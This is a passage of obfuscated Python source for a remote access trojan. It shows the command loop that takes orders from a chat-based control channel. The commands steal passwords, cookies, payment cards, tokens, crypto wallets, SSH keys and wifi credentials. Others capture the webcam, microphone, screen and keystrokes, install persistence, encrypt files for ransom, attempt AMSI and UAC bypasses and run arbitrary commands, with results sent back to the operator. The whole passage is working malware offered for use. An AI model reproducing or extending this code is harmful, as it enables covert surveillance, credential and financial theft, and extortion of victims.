                elif act=="blockinput":c.sendm(c.cc,_86())
                elif act=="unblockinput":c.sendm(c.cc,_87())
                elif act=="cd":c.sendm(c.cc,_75(arg))
                elif act=="ls":c.sendm(c.cc,f"```{_76(arg)[:1900]}```")
                elif act=="cat":c.sendm(c.cc,f"```{_77(arg)[:1900]}```")
                elif act=="rm":c.sendm(c.cc,_78(arg))
                elif act=="mkdir":c.sendm(c.cc,_79(arg))
                elif act=="upload":c.sendm(c.cc,_81(*arg.split(maxsplit=1)) if ' ' in arg else "upload <url> <path>")
                elif act=="download":
                    d=_80(arg)
                    if d:c.exfil(d,os.path.basename(arg));c.sendm(c.cc,"[+] File sent")
                    else:c.sendm(c.cc,"[-] File not found")
                elif act=="screenshot":
                    s2=_51()
                    if s2:c.exfil(s2,"screenshot.png");c.sendm(c.cc,"[+] Screenshot captured")
                    else:c.sendm(c.cc,"[-] Screenshot failed")
                elif act=="webcam":
                    w=_52()
                    if w:c.exfil(w,"webcam.jpg");c.sendm(c.cc,"[+] Webcam captured")
                    else:c.sendm(c.cc,"[-] Webcam failed")
                elif act=="mic":
                    a=_53()
                    if a:c.exfil(a,"audio.wav");c.sendm(c.cc,"[+] Audio recorded")
                    else:c.sendm(c.cc,"[-] Microphone failed")
                elif act=="sysinfo":c.sendm(c.cc,f"```{_42()[:1900]}```")
                elif act=="passwords":c.sendm(c.cc,f"```{_29()[:1900]}```")
                elif act=="history":c.sendm(c.cc,f"```{_32()[:1900]}```")
                elif act=="cookies":c.sendm(c.cc,f"```{_30()[:1900]}```")
                elif act=="cards":c.sendm(c.cc,f"```{_31()[:1900]}```")
                elif act=="bookmarks":c.sendm(c.cc,f"```{_33()[:1900]}```")
                elif act=="downloads":c.sendm(c.cc,f"```{_34()[:1900]}```")
                elif act=="roblox":c.sendm(c.cc,f"```{json.dumps(_35())[:1900]}```")
                elif act=="tokens":c.sendm(c.cc,f"```{json.dumps(_37())[:1900]}```")
                elif act=="wallets":c.sendm(c.cc,f"```{_36()[:1900]}```")
                elif act=="ssh":c.sendm(c.cc,f"```{json.dumps(_38())[:1900]}```")
                elif act=="wifi":c.sendm(c.cc,f"```{json.dumps(_39())[:1900]}```")
                elif act=="apps":c.sendm(c.cc,f"```{_41()[:1900]}```")
                elif act=="wmi":c.sendm(c.cc,f"```{json.dumps(_16())[:1900]}```")
                elif act=="window":c.sendm(c.cc,f"Active: {_15()}")
                elif act=="fingerprint":c.sendm(c.cc,f"ID: {_14()}")
                elif act=="webcams":c.sendm(c.cc,f"Cameras: {_17()}")
                elif act=="allwebcams":
                    cams=_18()
                    for idx,img in cams.items():
                        c.exfil(img,f"webcam_{idx}.jpg")
                    c.sendm(c.cc,f"[+] Captured {len(cams)} cameras")
                elif act=="record_screen":
                    sec=int(arg) if arg.isdigit() else 10
                    c.sendm(c.cc,f"Recording for {sec}s")
                    threading.Thread(target=lambda: c.exfil(_19(sec),f"rec_{int(time.time())}.mp4")).start()
                elif act=="clipboard":c.sendm(c.cc,f"Clipboard: {_40()}")
                elif act=="keylog":
                    if not _m.m:c.sendm(c.cc,"[-] Unavailable")
                    elif arg=="start":_m.start();c.sendm(c.cc,"[+] Started")
                    elif arg=="stop":_m.stop();c.sendm(c.cc,"[+] Stopped")
                    elif arg=="dump":
                        d=_m.dump()
                        if d:c.exfil(d,"keylog.txt");c.sendm(c.cc,"[+] Sent")
                        else:c.sendm(c.cc,"[-] No data")
                elif act=="idletime":c.sendm(c.cc,f"Idle: {_93()} seconds")
                elif act=="netstat":c.sendm(c.cc,f"```{_44()[:1900]}```")
                elif act=="arp":c.sendm(c.cc,f"```{_45()[:1900]}```")
                elif act=="dns":c.sendm(c.cc,f"```{_46()[:1900]}```")
                elif act=="software":c.sendm(c.cc,f"```{json.dumps(_47())[:1900]}```")
                elif act=="recent":c.sendm(c.cc,f"```{json.dumps(_48())[:1900]}```")
                elif act=="env":c.sendm(c.cc,f"```{_49()[:1900]}```")
                elif act=="geo":c.sendm(c.cc,f"```{_50()[:1900]}```")
                elif act=="ping":c.sendm(c.cc,_95())
                elif act=="osint":
                    if not arg:c.sendm(c.cc,"Usage: osint <username>")
                    else:
                        r=_56(arg)
                        if r:
                            out="\n".join([f"{p}: {u}" for p,u in r])
                            c.sendm(c.cc,f"```{out}```")
                        else:c.sendm(c.cc,"[-] No profiles found")
                elif act=="startup":_10(hp);c.sendm(c.cc,"[+] Persistence installed")
                elif act=="uninstall":c.sendm(c.cc,"[!] Uninstalling");_11();sys.exit(0)
                elif act=="selfdestruct":c.sendm(c.cc,"[!] Self-destructing");_11();_z();sys.exit(0)
                elif act=="ransom":
                    if arg=="enable":
                        _o=True
                        if len(sp)>1 and len(sp[1].split())>1:
                            _rn=sp[1].split()[1] if len(sp[1].split())>1 else "ransom@example.com"
                        c.sendm(c.cc,"[!] Ransomware enabled")
                    elif arg=="encrypt":c.sendm(c.cc,_60())
                    elif arg=="decrypt":c.sendm(c.cc,_61())
                    else:c.sendm(c.cc,"Usage: !ransom [enable|encrypt|decrypt]")
                elif act=="stream_start":
                    if not _i:c.sendm(c.cc,"[-] PyAutoGUI unavailable")
                    else:
                        _q=_72(c)
                        threading.Thread(target=_q.start,args=(c.cc,),daemon=True).start()
                        c.sendm(c.cc,"[+] Streaming started")
                elif act=="stream_stop":
                    if _q:_q.stop();c.sendm(c.cc,"[+] Streaming stopped")
                    else:c.sendm(c.cc,"[-] No stream")
                elif act=="stream_quality":
                    if arg.isdigit() and _q:
                        _q.q=min(100,max(1,int(arg)))
                        c.sendm(c.cc,f"[+] Quality set to {_q.q}%")
                    else:c.sendm(c.cc,"stream_quality <1-100>")
                elif act=="inject":c.sendm(c.cc,"[+] Injection placeholder")
                elif act=="amsi":_58();c.sendm(c.cc,"[+] AMSI/ETW bypass attempted")
                elif act=="uac":
                    if _59():c.sendm(c.cc,"[+] UAC bypass attempted")
                    else:c.sendm(c.cc,"[-] UAC bypass failed")
                elif act=="idiot":_62();c.sendm(c.cc,"[+] Idiot virus started")
                elif act=="stress":
                    if arg=="start":c.sendm(c.cc,_64())
                    elif arg=="stop":c.sendm(c.cc,_65())
                    else:c.sendm(c.cc,"stress [start|stop]")
                elif act=="beep":c.sendm(c.cc,_67())
                elif act=="mouse":c.sendm(c.cc,_68())
                elif act=="openmany":c.sendm(c.cc,_69())
                elif act=="flip":c.sendm(c.cc,_70())
                elif act=="scream":c.sendm(c.cc,_71())
                else:
                    out=_73(cmd)
                    c.sendm(c.cc,f"```{out[:1900]}```")
            time.sleep(random.uniform(2,5))
        except:time.sleep(5)
if __name__=="__main__":
    _97()
